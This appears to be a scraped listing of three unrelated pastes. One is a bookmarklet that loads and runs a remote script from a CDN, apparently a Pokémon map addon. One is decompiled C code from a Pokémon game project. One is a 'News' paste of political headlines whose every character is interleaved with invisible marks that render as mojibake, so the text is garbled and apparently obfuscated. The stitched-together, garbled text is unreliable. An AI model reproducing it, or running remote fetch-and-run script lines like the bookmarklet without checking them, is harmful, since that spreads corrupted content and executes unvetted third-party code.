HnYvz52Q,altaria pvp Filter,name8888less,JavaScript,Saturday 16th of March 2024 09:48:03 PM CDT,"javascript:$.getScript(""https://cdn.jsdelivr.net/gh/name8888less/sgpokemap-addons@main/altaria-gl-pvp-filter.js"", function(data, textStatus, jqxhr) {});
"
t1sfn3Us,ov62_02232778,Kurausukun,C,Saturday 16th of March 2024 09:45:18 PM CDT,"void ov62_02232778(UnkStruct_ov62_02233310 *param0, UnkStruct_0208C06C *param1, MessageLoader *param2, const UnkStruct_ov62_02248CDC *param3, int param4, int param5, Strbuf *param6) {
    int v0;
    Window *v1;
    Strbuf *v2;
    Strbuf *v3;
    Strbuf *v4;
    Strbuf *v5;
    Strbuf *v6;
    UnkStruct_0200B358 *v7;
    int v8 = 0;
    u64 v9 = 0;
    int v10[30] = {0};
    Strbuf *v11;

    v1 = &param0->unk_18;

    param0->unk_04 = param3->unk_04;
    param0->unk_00 = 0;

    param0->unk_0C = 0;
    param0->unk_10 = param3->unk_24;
    param0->unk_28 = param3;
    if (param2) {
        param0->unk_34 = param2;
    } else {
        param0->unk_34 = param1->unk_14.unk_34;
    }

    param0->unk_14 = (param0->unk_04 / param0->unk_10) + 1;
    if (param0->unk_04 < param0->unk_10) {
        param0->unk_10 = param0->unk_04;
        param0->unk_38.unk_08 = param0->unk_10 - 1;
        param0->unk_38.unk_0C = param0->unk_10 - 1;
    }

    param0->unk_38.unk_08 = param0->unk_10 / 2;
    param0->unk_38.unk_0C = param0->unk_10 / 2;

    sub_0201A7A0(v1);
    BGL_AddWindow(param1->unk_14.unk_10, v1, param3->unk_20, param3->unk_0C, param3->unk_10, param3->unk_14, param3->unk_18, 14, param3->unk_1C);
    BGL_FillWindow(v1, 0x00);

    v7 = ov62_02231690(102);

    {
        u64 v12 = param0->unk_28->unk_00[0].unk_08;
        int v13[] = {16, 12, 20};

        v9 = v12;
        v10[0] = v8;

        for (v0 = 1; v0 < v13[param5]; v0++) {
            u64 v14 = param0->unk_28->unk_00[v0].unk_08;

            if (v14 == v9) {
                v10[v0] = v8;
            } else {
                v9 = v14;
                v10[v0] = v0;
                v8 = v0;
            }
        }
    }

    for (v0 = 0; v0 < param0->unk_10; v0++) {
        v3 = MessageLoader_GetNewStrbuf(param1->unk_14.unk_34, 88 + param5);

        v4 = Strbuf_Init(255, 102);
        v6 = Strbuf_Init(255, 102);
        v11 = Strbuf_Init(255, 102);

        switch (param5) {
        case 0:
        {
            int v15 = param0->unk_28->unk_00[v0].unk_04;

            v5 = MessageLoader_GetNewStrbuf(param0->unk_34, v15);
        }
        break;
        case 1:
        {
            int v16 = param0->unk_28->unk_00[v0].unk_04;

            v5 = Strbuf_Init(255, 102);
            Strbuf_FormatInt(v5, v16, 2, 1, 1);
        }
        break;
        case 2:
        {
            u16 v17[255];
            int v18 = param0->unk_28->unk_00[v0].unk_04;

            v5 = Strbuf_Init(255, 102);
            MessageLoader_GetSpeciesName(v18, 102, v17);
            Strbuf_CopyChars(v5, v17);
        }
        break;
        }

        {
            u64 v19 = param0->unk_28->unk_00[v0].unk_08;

            Strbuf_FormatU64(v11, v19, ov62_0223438C(v19), 0, 1);
        }
        Strbuf_FormatInt(v4, v10[v0] + 1, 2, 1, 1);
        sub_0200B48C(v7, 0, v4, 0, 1, 2);
        sub_0200B48C(v7, 1, v5, 0, 1, 2);
        sub_0200C388(v7, v6, v3);

        sub_0201D78C(v1, 0, v6, 0, v0 * (16 * param0->unk_28->unk_08), (0xff), ((u32)(((15 & (0xff)) << 16) | ((13 & (0xff)) << 8) | ((0 & (0xff)) << 0))), NULL);
        if (param0->unk_28->unk_08 == 2) {
            int v20 = sub_02002D7C(0, v11, 0);

            sub_0201D78C(v1, 0, v11, 16, (v0 * (16 * param0->unk_28->unk_08)) + 16, (0xff), ((u32)(((15 & (0xff)) << 16) | ((13 & (0xff)) << 8) | ((0 & (0xff)) << 0))), NULL);
            if (param6) {
                sub_0201D78C(v1, 0, param6, 16 + v20, (v0 * (16 * param0->unk_28->unk_08)) + 16, (0xff), ((u32)(((15 & (0xff)) << 16) | ((13 & (0xff)) << 8) | ((0 & (0xff)) << 0))), NULL);
            }
        }

        Strbuf_Free(v3);
        Strbuf_Free(v4);
        Strbuf_Free(v5);
        Strbuf_Free(v6);

        Strbuf_Free(v11);

        sub_0200C41C(v7);
    }

    sub_0201A9A4(v1);
    sub_0200B3F0(v7);
}"
SkEnrUED,News March16 24,Newscaster_Ned,Email,Saturday 16th of March 2024 09:03:59 PM CDT,".‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé1‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé2‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé3‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äéc‚Äéo‚Äém‚Äép‚Äél‚Äée‚Äét‚Äée‚Äé.‚Äé

H‚Äée‚Äér‚Äée‚Äé'‚Äés‚Äé ‚Äém‚Äéo‚Äér‚Äée‚Äé ‚Äén‚Äée‚Äéw‚Äés‚Äé.‚Äé

E‚Äéx‚Äéc‚Äél‚Äéu‚Äés‚Äéi‚Äév‚Äée‚Äé ‚Äé‚Äî‚Äé ‚ÄéA‚Äés‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚ÄéP‚Äér‚Äée‚Äés‚Äés‚Äé ‚ÄéA‚Äéd‚Äém‚Äéi‚Äét‚Äés‚Äé ‚ÄéI‚Äét‚Äé ‚ÄéH‚Äéa‚Äés‚Äé ‚ÄéN‚Äéo‚Äé ‚Äé‚Äò‚ÄéG‚Äée‚Äéo‚Äél‚Äéo‚Äéc‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚ÄéD‚Äéa‚Äét‚Äéa‚Äé‚Äô‚Äé ‚Äét‚Äéo‚Äé ‚ÄéB‚Äéa‚Äéc‚Äék‚Äé ‚ÄéU‚Äép‚Äé ‚ÄéB‚Äée‚Äér‚Äén‚Äéi‚Äée‚Äé ‚ÄéM‚Äéo‚Äér‚Äée‚Äén‚Äéo‚Äé ‚ÄéS‚Äém‚Äée‚Äéa‚Äér‚Äé
W‚ÄéA‚ÄéS‚ÄéH‚ÄéI‚ÄéN‚ÄéG‚ÄéT‚ÄéO‚ÄéN‚Äé ‚Äé-‚Äé ‚ÄéM‚ÄéA‚ÄéR‚ÄéC‚ÄéH‚Äé ‚Äé1‚Äé5‚Äé:‚Äé ‚ÄéB‚Äée‚Äér‚Äén‚Äéi‚Äée‚Äé ‚ÄéM‚Äéo‚Äér‚Äée‚Äén‚Äéo‚Äé,‚Äé ‚ÄéR‚Äée‚Äép‚Äéu‚Äéb‚Äél‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚Äéc‚Äéa‚Äén‚Äéd‚Äéi‚Äéd‚Äéa‚Äét‚Äée‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéS‚Äée‚Äén‚Äéa‚Äét‚Äée‚Äé,‚Äé ‚Äéa‚Äét‚Äét‚Äée‚Äén‚Äéd‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéC‚Äéo‚Äél‚Äéu‚Äém‚Äéb‚Äéi‚Äé
A‚Äé ‚Äés‚Äép‚Äéo‚Äék‚Äée‚Äés‚Äéw‚Äéo‚Äém‚Äéa‚Äén‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéA‚Äés‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚ÄéP‚Äér‚Äée‚Äés‚Äés‚Äé ‚Äé(‚ÄéA‚ÄéP‚Äé)‚Äé ‚Äéa‚Äéd‚Äém‚Äéi‚Äét‚Äét‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚ÄéB‚Äér‚Äée‚Äéi‚Äét‚Äéb‚Äéa‚Äér‚Äét‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äé ‚Äéo‚Äén‚Äé ‚ÄéS‚Äéa‚Äét‚Äéu‚Äér‚Äéd‚Äéa‚Äéy‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéo‚Äér‚Äég‚Äéa‚Äén‚Äéi‚Äéz‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéd‚Äéo‚Äée‚Äés‚Äé ‚Äén‚Äéo‚Äét‚Äé,‚Äé ‚Äéd‚Äée‚Äés‚Äép‚Äéi‚Äét‚Äée‚Äé ‚Äép‚Äér‚Äée‚Äév‚Äéi‚Äéo‚Äéu‚Äés‚Äél‚Äéy‚Äé ‚Äér‚Äée‚Äép‚Äéo‚Äér‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéw‚Äéo‚Äé ‚Äéd‚Äéi‚Äéf‚Äéf‚Äée‚Äér‚Äée‚Äén‚Äét‚Äé ‚Äép‚Äéi‚Äée‚Äéc‚Äée‚Äés‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéi‚Äét‚Äé ‚Äéd‚Äéi‚Äéd‚Äé,‚Äé ‚Äéh‚Äéa‚Äév‚Äée‚Äé ‚Äéa‚Äén‚Äéy‚Äé ‚Äé‚Äú‚Äég‚Äée‚Äéo‚Äél‚Äéo‚Äéc‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéd‚Äéa‚Äét‚Äéa‚Äé‚Äù‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äéa‚Äéc‚Äék‚Äé ‚Äéu‚Äép‚Äé ‚Äéi‚Äét‚Äés‚Äé ‚Äés‚Äém‚Äée‚Äéa‚Äér‚Äé ‚Äép‚Äéi‚Äée‚Äéc‚Äée‚Äé ‚Äéa‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚ÄéO‚Äéh‚Äéi‚Äéo‚Äé ‚ÄéS‚Äée‚Äén‚Äéa‚Äét‚Äée‚Äé ‚Äéc‚Äéa‚Äén‚Äéd‚Äéi‚Äéd‚Äéa‚Äét‚Äée‚Äé ‚ÄéB‚Äée‚Äér‚Äén‚Äéi‚Äée‚Äé ‚ÄéM‚Äéo‚Äér‚Äée‚Äén‚Äéo‚Äé.‚Äé

V‚ÄéI‚ÄéD‚ÄéE‚ÄéO‚Äé ‚Äé‚Äî‚Äé ‚Äé‚Äò‚ÄéU‚Äég‚Äél‚Äéy‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéC‚Äér‚Äéu‚Äée‚Äél‚Äé‚Äô‚Äé:‚Äé ‚ÄéT‚Äée‚Äéx‚Äéa‚Äés‚Äé ‚ÄéN‚Äée‚Äéi‚Äég‚Äéh‚Äéb‚Äéo‚Äér‚Äés‚Äé ‚ÄéM‚Äéo‚Äéu‚Äér‚Äén‚Äé ‚ÄéT‚Äée‚Äée‚Äén‚Äéa‚Äég‚Äée‚Äé ‚ÄéG‚Äéi‚Äér‚Äél‚Äé ‚ÄéF‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚ÄéL‚Äée‚Äéf‚Äét‚Äé ‚Äéi‚Äén‚Äé ‚ÄéD‚Äéi‚Äét‚Äéc‚Äéh‚Äé ‚Äé
V‚ÄéI‚ÄéD‚ÄéE‚ÄéO‚Äé:‚Äé ‚ÄéT‚Äée‚Äéx‚Äéa‚Äés‚Äé ‚ÄéN‚Äée‚Äéi‚Äég‚Äéh‚Äéb‚Äéo‚Äér‚Äés‚Äé ‚ÄéM‚Äéo‚Äéu‚Äér‚Äén‚Äé ‚ÄéT‚Äée‚Äée‚Äén‚Äé ‚ÄéF‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚ÄéL‚Äée‚Äéf‚Äét‚Äé ‚Äéi‚Äén‚Äé ‚ÄéD‚Äéi‚Äét‚Äéc‚Äéh‚Äé ‚Äé'‚Äél‚Äéi‚Äék‚Äée‚Äé ‚Äéa‚Äén‚Äé ‚ÄéA‚Äén‚Äéi‚Äém‚Äéa‚Äél‚Äé'‚Äé
1‚Äé2‚Äé4‚Äé
D‚Äéi‚Äés‚Äét‚Äér‚Äéi‚Äéc‚Äét‚Äé ‚ÄéJ‚Äéu‚Äéd‚Äég‚Äée‚Äé:‚Äé ‚ÄéG‚Äéu‚Äén‚Äé ‚ÄéB‚Äéa‚Äén‚Äé ‚ÄéF‚Äéo‚Äér‚Äé ‚ÄéI‚Äél‚Äél‚Äée‚Äég‚Äéa‚Äél‚Äé ‚ÄéI‚Äém‚Äém‚Äéi‚Äég‚Äér‚Äéa‚Äén‚Äét‚Äé ‚ÄéU‚Äén‚Äéc‚Äéo‚Äén‚Äés‚Äét‚Äéi‚Äét‚Äéu‚Äét‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äé
D‚Äéi‚Äés‚Äét‚Äér‚Äéi‚Äéc‚Äét‚Äé ‚ÄéJ‚Äéu‚Äéd‚Äég‚Äée‚Äé:‚Äé ‚ÄéG‚Äéu‚Äén‚Äé ‚ÄéB‚Äéa‚Äén‚Äé ‚ÄéF‚Äéo‚Äér‚Äé ‚ÄéI‚Äél‚Äél‚Äée‚Äég‚Äéa‚Äél‚Äé ‚ÄéI‚Äém‚Äém‚Äéi‚Äég‚Äér‚Äéa‚Äén‚Äét‚Äé ‚ÄéU‚Äén‚Äéc‚Äéo‚Äén‚Äés‚Äét‚Äéi‚Äét‚Äéu‚Äét‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äé
9‚Äé6‚Äé0‚Äé
F‚Äéo‚Äér‚Äée‚Äév‚Äée‚Äér‚Äé ‚ÄéW‚Äéa‚Äér‚Äé:‚Äé ‚ÄéL‚Äée‚Äéa‚Äéd‚Äée‚Äér‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéF‚Äér‚Äéa‚Äén‚Äéc‚Äée‚Äé,‚Äé ‚ÄéG‚Äée‚Äér‚Äém‚Äéa‚Äén‚Äéy‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéP‚Äéo‚Äél‚Äéa‚Äén‚Äéd‚Äé ‚ÄéV‚Äéo‚Äéw‚Äé ‚Äét‚Äéo‚Äé ‚ÄéP‚Äér‚Äéo‚Äéd‚Äéu‚Äéc‚Äée‚Äé ‚ÄéM‚Äéo‚Äér‚Äée‚Äé ‚ÄéW‚Äée‚Äéa‚Äép‚Äéo‚Äén‚Äés‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéU‚Äék‚Äér‚Äéa‚Äéi‚Äén‚Äée‚Äé
F‚Äér‚Äéa‚Äén‚Äéc‚Äée‚Äé,‚Äé ‚ÄéG‚Äée‚Äér‚Äém‚Äéa‚Äén‚Äéy‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéP‚Äéo‚Äél‚Äéa‚Äén‚Äéd‚Äé ‚ÄéV‚Äéo‚Äéw‚Äé ‚Äét‚Äéo‚Äé ‚ÄéP‚Äér‚Äéo‚Äéd‚Äéu‚Äéc‚Äée‚Äé ‚ÄéM‚Äéo‚Äér‚Äée‚Äé ‚ÄéW‚Äée‚Äéa‚Äép‚Äéo‚Äén‚Äés‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéU‚Äék‚Äér‚Äéa‚Äéi‚Äén‚Äée‚Äé
9‚Äé9‚Äé7‚Äé
P‚Äée‚Äén‚Äéc‚Äée‚Äé:‚Äé ‚Äé‚Äò‚ÄéI‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äé ‚ÄéN‚Äéo‚Äét‚Äé ‚ÄéB‚Äée‚Äé ‚ÄéE‚Äén‚Äéd‚Äéo‚Äér‚Äés‚Äéi‚Äén‚Äég‚Äé ‚ÄéD‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé‚Äô‚Äé
P‚Äée‚Äén‚Äéc‚Äée‚Äé:‚Äé ‚Äé'‚ÄéI‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äé ‚ÄéN‚Äéo‚Äét‚Äé ‚ÄéB‚Äée‚Äé ‚ÄéE‚Äén‚Äéd‚Äéo‚Äér‚Äés‚Äéi‚Äén‚Äég‚Äé ‚ÄéD‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé'‚Äé
6‚Äé,‚Äé1‚Äé3‚Äé7‚Äé
P‚Äéo‚Äél‚Äél‚Äéa‚Äék‚Äé:‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéA‚Äét‚Äét‚Äéa‚Äéc‚Äék‚Äé ‚Äéo‚Äén‚Äé ‚ÄéN‚Äée‚Äét‚Äéa‚Äén‚Äéy‚Äéa‚Äéh‚Äéu‚Äé ‚ÄéC‚Äéa‚Äéu‚Äés‚Äée‚Äés‚Äé ‚ÄéW‚Äéo‚Äér‚Äés‚Äét‚Äé ‚ÄéC‚Äér‚Äéi‚Äés‚Äéi‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚ÄéH‚Äéi‚Äés‚Äét‚Äéo‚Äér‚Äéy‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéU‚Äé.‚ÄéS‚Äé.‚Äé-‚ÄéI‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äé ‚ÄéR‚Äée‚Äél‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äés‚Äé
P‚Äéo‚Äél‚Äél‚Äéa‚Äék‚Äé:‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéC‚Äéa‚Äéu‚Äés‚Äée‚Äés‚Äé ‚ÄéW‚Äéo‚Äér‚Äés‚Äét‚Äé ‚ÄéC‚Äér‚Äéi‚Äés‚Äéi‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚ÄéH‚Äéi‚Äés‚Äét‚Äéo‚Äér‚Äéy‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéU‚Äé.‚ÄéS‚Äé.‚Äé-‚ÄéI‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äé ‚ÄéR‚Äée‚Äél‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äés‚Äé
7‚Äé,‚Äé6‚Äé6‚Äé7‚Äé
V‚ÄéI‚ÄéD‚ÄéE‚ÄéO‚Äé ‚Äé‚Äî‚Äé ‚Äé‚Äò‚ÄéA‚Äé ‚ÄéH‚Äéi‚Äés‚Äét‚Äéo‚Äér‚Äéi‚Äéc‚Äé ‚ÄéM‚Äéo‚Äém‚Äée‚Äén‚Äét‚Äé‚Äô‚Äé:‚Äé ‚ÄéN‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äé ‚ÄéA‚Äés‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéR‚Äée‚Äéa‚Äél‚Äét‚Äéo‚Äér‚Äés‚Äé ‚ÄéS‚Äée‚Äét‚Äét‚Äél‚Äée‚Äém‚Äée‚Äén‚Äét‚Äé ‚ÄéC‚Äéh‚Äéa‚Äén‚Äég‚Äée‚Äés‚Äé ‚Äé
V‚ÄéI‚ÄéD‚ÄéE‚ÄéO‚Äé:‚Äé ‚ÄéN‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äé ‚ÄéA‚Äés‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéR‚Äée‚Äéa‚Äél‚Äét‚Äéo‚Äér‚Äés‚Äé'‚Äé ‚ÄéS‚Äée‚Äét‚Äét‚Äél‚Äée‚Äém‚Äée‚Äén‚Äét‚Äé ‚ÄéC‚Äéh‚Äéa‚Äén‚Äég‚Äée‚Äés‚Äé ‚Äé6‚Äé%‚Äé ‚ÄéC‚Äéo‚Äém‚Äém‚Äéi‚Äés‚Äés‚Äéi‚Äéo‚Äén‚Äé
1‚Äé2‚Äé3‚Äé
J‚Äéu‚Äéd‚Äég‚Äée‚Äé ‚ÄéS‚Äéc‚Äéo‚Äét‚Äét‚Äé ‚ÄéM‚Äéc‚ÄéA‚Äéf‚Äée‚Äée‚Äé ‚ÄéR‚Äéu‚Äél‚Äée‚Äés‚Äé ‚ÄéF‚Äéa‚Äén‚Äéi‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äéi‚Äés‚Äé ‚ÄéC‚Äéa‚Äén‚Äé ‚ÄéR‚Äée‚Äém‚Äéa‚Äéi‚Äén‚Äé ‚Äéo‚Äén‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéC‚Äéa‚Äés‚Äée‚Äé ‚Äéi‚Äéf‚Äé ‚ÄéS‚Äéh‚Äée‚Äé ‚ÄéF‚Äéi‚Äér‚Äée‚Äés‚Äé ‚Äée‚Äéx‚Äé-‚ÄéL‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéW‚Äéa‚Äéd‚Äée‚Äé
J‚Äéu‚Äéd‚Äég‚Äée‚Äé ‚ÄéS‚Äéc‚Äéo‚Äét‚Äét‚Äé ‚ÄéM‚Äéc‚ÄéA‚Äéf‚Äée‚Äée‚Äé ‚ÄéD‚Äée‚Äén‚Äéi‚Äée‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚ÄéP‚Äéa‚Äér‚Äét‚Äé ‚ÄéM‚Äéo‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚ÄéD‚Äéi‚Äés‚Äéq‚Äéu‚Äéa‚Äél‚Äéi‚Äéf‚Äéy‚Äé ‚ÄéF‚Äéa‚Äén‚Äéi‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äéi‚Äés‚Äé
1‚Äé0‚Äé,‚Äé2‚Äé8‚Äé1‚Äé
M‚Äéa‚Äéh‚Äée‚Äér‚Äé:‚Äé ‚Äé‚Äò‚ÄéI‚Äén‚Äéf‚Äél‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚ÄéP‚Äée‚Äér‚Äés‚Äéi‚Äés‚Äét‚Äés‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéa‚Äé ‚ÄéL‚Äéo‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéT‚Äéh‚Äéi‚Äén‚Äég‚Äés‚Äé,‚Äé‚Äô‚Äé ‚ÄéB‚Äéu‚Äét‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé‚Äô‚Äés‚Äé ‚ÄéR‚Äéa‚Äét‚Äéi‚Äén‚Äég‚Äés‚Äé ‚ÄéA‚Äér‚Äée‚Äé ‚ÄéB‚Äéa‚Äéd‚Äé ‚ÄéB‚Äée‚Äéc‚Äéa‚Äé
M‚Äéa‚Äéh‚Äée‚Äér‚Äé:‚Äé ‚Äé'‚ÄéI‚Äén‚Äéf‚Äél‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚ÄéP‚Äée‚Äér‚Äés‚Äéi‚Äés‚Äét‚Äés‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéa‚Äé ‚ÄéL‚Äéo‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéT‚Äéh‚Äéi‚Äén‚Äég‚Äés‚Äé,‚Äé'‚Äé ‚ÄéB‚Äéu‚Äét‚Äé ‚ÄéP‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé ‚ÄéA‚Äér‚Äée‚Äé ‚ÄéT‚Äéo‚Äéo‚Äé ‚ÄéD‚Äéo‚Äéu‚Äér‚Äé
1‚Äé,‚Äé3‚Äé1‚Äé3‚Äé
N‚Äée‚Äét‚Äéf‚Äél‚Äéi‚Äéx‚Äé ‚ÄéU‚Äés‚Äée‚Äér‚Äés‚Äé ‚ÄéT‚Äéh‚Äér‚Äée‚Äéa‚Äét‚Äée‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚Äé‚Äò‚ÄéC‚Äéa‚Äén‚Äéc‚Äée‚Äél‚Äé‚Äô‚Äé ‚ÄéS‚Äéu‚Äéb‚Äés‚Äéc‚Äér‚Äéi‚Äép‚Äét‚Äéi‚Äéo‚Äén‚Äés‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéS‚Äée‚Äéx‚Äéu‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚ÄéE‚Äéx‚Äép‚Äél‚Äéi‚Äéc‚Äéi‚Äét‚Äé ‚ÄéS‚Äée‚Äér‚Äéi‚Äée‚Äés‚Äé
N‚Äée‚Äét‚Äéf‚Äél‚Äéi‚Äéx‚Äé ‚ÄéU‚Äés‚Äée‚Äér‚Äés‚Äé ‚ÄéT‚Äéh‚Äér‚Äée‚Äéa‚Äét‚Äée‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚Äé'‚ÄéC‚Äéa‚Äén‚Äéc‚Äée‚Äél‚Äé'‚Äé ‚ÄéS‚Äéu‚Äéb‚Äés‚Äéc‚Äér‚Äéi‚Äép‚Äét‚Äéi‚Äéo‚Äén‚Äés‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéE‚Äéx‚Äép‚Äél‚Äéi‚Äéc‚Äéi‚Äét‚Äé ‚ÄéS‚Äée‚Äér‚Äéi‚Äée‚Äés‚Äé
2‚Äé6‚Äé3‚Äé
E‚Äéx‚Äéc‚Äél‚Äéu‚Äés‚Äéi‚Äév‚Äée‚Äé ‚Äé‚Äî‚Äé ‚ÄéA‚Äés‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚ÄéP‚Äér‚Äée‚Äés‚Äés‚Äé ‚ÄéA‚Äéd‚Äém‚Äéi‚Äét‚Äés‚Äé ‚ÄéI‚Äét‚Äé ‚ÄéH‚Äéa‚Äés‚Äé ‚ÄéN‚Äéo‚Äé ‚Äé‚Äò‚ÄéG‚Äée‚Äéo‚Äél‚Äéo‚Äéc‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚ÄéD‚Äéa‚Äét‚Äéa‚Äé‚Äô‚Äé ‚Äét‚Äéo‚Äé ‚ÄéB‚Äéa‚Äéc‚Äék‚Äé ‚ÄéU‚Äép‚Äé ‚ÄéB‚Äée‚Äér‚Äén‚Äéi‚Äée‚Äé ‚ÄéM‚Äéo‚Äér‚Äée‚Äén‚Äéo‚Äé ‚ÄéS‚Äém‚Äée‚Äé
E‚Äéx‚Äéc‚Äél‚Äéu‚Äés‚Äéi‚Äév‚Äée‚Äé ‚Äé‚Äî‚Äé ‚ÄéA‚ÄéP‚Äé ‚ÄéA‚Äéd‚Äém‚Äéi‚Äét‚Äés‚Äé ‚ÄéI‚Äét‚Äé ‚ÄéH‚Äéa‚Äés‚Äé ‚ÄéN‚Äéo‚Äé ‚Äé‚Äò‚ÄéG‚Äée‚Äéo‚Äél‚Äéo‚Äéc‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚ÄéD‚Äéa‚Äét‚Äéa‚Äé‚Äô‚Äé ‚Äét‚Äéo‚Äé ‚ÄéB‚Äéa‚Äéc‚Äék‚Äé ‚ÄéU‚Äép‚Äé ‚ÄéM‚Äéo‚Äér‚Äée‚Äén‚Äéo‚Äé ‚ÄéS‚Äém‚Äée‚Äéa‚Äér‚Äé

